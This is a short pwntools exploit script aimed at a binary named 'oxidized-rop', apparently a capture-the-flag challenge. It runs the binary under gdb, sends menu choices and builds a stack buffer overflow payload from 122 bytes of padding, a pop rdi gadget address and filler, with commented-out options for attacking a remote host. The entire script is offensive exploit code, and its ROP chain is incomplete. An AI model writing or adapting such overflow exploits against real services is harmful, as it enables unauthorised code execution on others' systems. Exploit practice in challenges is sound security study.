from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./oxidized-rop")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": ""}


#p = remote("ip", 4444)
#p = process("./oxidized-rop")
p = gdb.debug("./oxidized-rop",'''
b *_ZN12oxidized_rop4main17h3b2fbbcaac189096E+236''')

# Stack Canary Leak Setup
p.sendline(b"1")
p.recvline()

#ROP
pop_rdi = p64(0x0000000000007f75)

# Exploit
padA = b'A' * 122
padB = pop_rdi
padC = b'C' * (200-122-8)

exploit = padA + padB + padC
p.recvline()
p.sendline(exploit)

p.sendline(b"3")
p.recvline()

p.interactive()
